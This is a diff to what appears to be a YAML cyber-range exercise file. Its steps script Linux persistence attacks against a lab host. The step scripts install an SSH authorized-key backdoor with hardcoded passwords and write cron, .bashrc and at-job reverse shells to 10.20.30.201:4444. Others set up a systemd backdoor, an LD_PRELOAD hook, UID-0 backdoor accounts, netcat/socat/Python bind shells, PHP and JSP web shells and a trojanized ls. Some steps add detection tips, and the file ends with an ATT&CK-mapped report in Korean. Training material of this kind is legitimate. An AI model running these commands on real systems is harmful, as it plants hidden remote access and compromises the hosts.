@@ -25,6 +25,7 @@ steps:
     type: output_contains
     expect: backdoor successful
     field: stdout
+  target_vm: attacker
   script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 ''mkdir -p ~/.ssh && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub
     | sshpass -p1 ssh web@10.20.30.80 ''cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'' 2>/dev/null && ssh -i /tmp/backdoor_key -o StrictHostKeyChecking=no web@10.20.30.80 ''echo SSH
     key backdoor successful: $(whoami)'' 2>/dev/null'
@@ -41,6 +42,7 @@ steps:
     type: output_contains
     expect: Cron backdoor payload
     field: stdout
+  target_vm: attacker
   script: echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash -c "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt && echo 'Cron backdoor payload:'
     && cat /tmp/cron_backdoor.txt
   risk_level: medium
@@ -81,6 +83,7 @@ steps:
     type: output_contains
     expect: Systemd backdoor
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/backdoor.service << ''EOF''
 
     [Unit]
@@ -120,6 +123,7 @@ steps:
     type: output_contains
     expect: 'Payload:'
     field: stdout
+  target_vm: attacker
   script: echo '# .bashrc persistence payload (simulation only)' && echo 'echo "nohup bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 &" >> ~/.bashrc' > /tmp/bashrc_backdoor.txt && echo 'Payload:' && cat /tmp/bashrc_backdoor.txt
   risk_level: medium
 - order: 5
@@ -134,6 +138,7 @@ steps:
     type: output_contains
     expect: update.sh
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh
     && chmod +x /tmp/.hidden_backdoor/update.sh && ls -la /tmp/.hidden_backdoor/' 2>/dev/null
   risk_level: medium
@@ -148,6 +153,7 @@ steps:
     type: output_contains
     expect: pam
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null' 2>/dev/null | head -30
   risk_level: low
 - order: 7
@@ -162,6 +168,7 @@ steps:
     type: output_contains
     expect: LD_PRELOAD hook
     field: stdout
+  target_vm: attacker
   script: "echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n    printf(\"[LD_PRELOAD hook executed] PID=%d\\n\", getpid());\n}' > /tmp/hook.c && gcc -shared -fPIC\
     \ -o /tmp/hook.so /tmp/hook.c 2>/dev/null && LD_PRELOAD=/tmp/hook.so id 2>/dev/null"
   risk_level: medium
@@ -177,6 +184,7 @@ steps:
     type: output_contains
     expect: Detection
     field: stdout
+  target_vm: attacker
   script: 'echo ''# Backdoor user account (simulation)'' && echo ''Method 1: useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor'' && echo ''Method 2: echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd''
     && echo ''Method 3: echo "backdoor:\$6\$salt\$hash:0:0:99999:7:::" >> /etc/shadow'' && echo ''---'' && echo ''Detection: check /etc/passwd for duplicate UID 0 entries'' && grep ''x:0:'' /etc/passwd'
   risk_level: medium
@@ -193,6 +201,7 @@ steps:
     type: output_contains
     expect: Bind Shell Backdoors
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Bind Shell Backdoors ==='' && echo ''Netcat: nohup nc -lvnp 5555 -e /bin/bash &'' && echo ''Socat: nohup socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash &'' && echo ''Python: nohup
     python3 -c "import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",5555));s.listen(1);c,_=s.accept();subprocess.call([\"/bin/bash\"],stdin=c,stdout=c,stderr=c)" &'' && echo ''---'' && echo ''Detection:
     ss -tlnp | grep LISTEN for unexpected ports'''
@@ -210,6 +219,7 @@ steps:
     type: output_contains
     expect: Web Shell Examples
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Web Shell Examples ==='' && echo ''PHP: <?php system(\$_GET["cmd"]); ?>'' > /tmp/webshell_example.php && echo ''JSP: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'' &&
     echo ''Python: import os; os.system(request.args.get("cmd"))'' && echo ''---'' && echo ''Placement: /var/www/html/.hidden.php'' && echo ''Usage: curl http://target/.hidden.php?cmd=id'' && echo ''Detection:
     find /var/www -name "*.php" -newer /var/www/html/index.html'' && cat /tmp/webshell_example.php'
@@ -226,6 +236,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: 'echo ''echo backdoor_executed > /tmp/at_test'' | at now + 1 minute 2>/dev/null; atq 2>/dev/null; echo ''---''; echo ''at-based persistence: echo "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" |
     at now + 5 minutes'''
   risk_level: medium
@@ -241,6 +252,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)" /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo
     'Persistence via sshd_config:' && echo '1. PermitRootLogin yes -> root SSH 직접 접속' && echo '2. AuthorizedKeysFile 변경 -> 숨겨진 위치의 키 파일 사용' && echo '3. 추가 Port 열기 -> 비표준 포트로 SSH 접속'
   risk_level: low
@@ -257,6 +269,7 @@ steps:
     type: output_contains
     expect: Detection
     field: stdout
+  target_vm: attacker
   script: 'echo ''#!/bin/bash'' > /tmp/trojan_ls.sh && echo ''# Trojanized ls - hides .backdoor files'' >> /tmp/trojan_ls.sh && echo ''/usr/bin/ls.orig "$@" | grep -v backdoor'' >> /tmp/trojan_ls.sh &&
     echo ''---'' && echo ''Installation steps (NOT executed):'' && echo ''1. cp /usr/bin/ls /usr/bin/ls.orig'' && echo ''2. mv /tmp/trojan_ls.sh /usr/bin/ls'' && echo ''3. chmod +x /usr/bin/ls'' && echo
     ''---'' && echo ''Detection: debsums --changed (Debian) or rpm -Va (RHEL)'' && cat /tmp/trojan_ls.sh'
@@ -274,6 +287,7 @@ steps:
     type: output_contains
     expect: Persistence Hunt
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys 2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null
     | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service 2>/dev/null | wc -l; echo "[Hidden /tmp]"; find /tmp -name ".*" -type d 2>/dev/null; echo "[SUID]"; find / -perm -4000 -newer /etc/hostname
     2>/dev/null | wc -l; echo "[at queue]"; atq 2>/dev/null' 2>/dev/null
@@ -291,6 +305,7 @@ steps:
     type: output_contains
     expect: Persistence Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Persistence Report ===\n\n[Techniques Used]\n1. SSH Authorized Keys (T1098.004) - authorized_keys에 공개키 추가\n2. Cron Job (T1053.003) - 리버스 셸 cron 등록\n3. Systemd Service (T1543.002)
     - 부팅 시 자동 실행 서비스\n4. .bashrc Modification (T1546.004) - 로그인 시 실행\n5. Hidden Files (T1564.001) - /tmp에 숨겨진 백도어\n6. Web Shell (T1505.003) - 웹 루트에 PHP 셸\n7. Account Creation (T1136.001) - UID 0 백도어 계정\n\n[Detection
     Methods]\n- FIM: authorized_keys, sshd_config, /etc/passwd 감시\n- Cron audit: 모든 사용자 crontab 정기 검사\n- Network: 비정상 아웃바운드 연결 모니터링\n- Process: 비정상 프로세스 트리 분석'' > /tmp/persistence_report.txt && cat /tmp/persistence_report.txt'
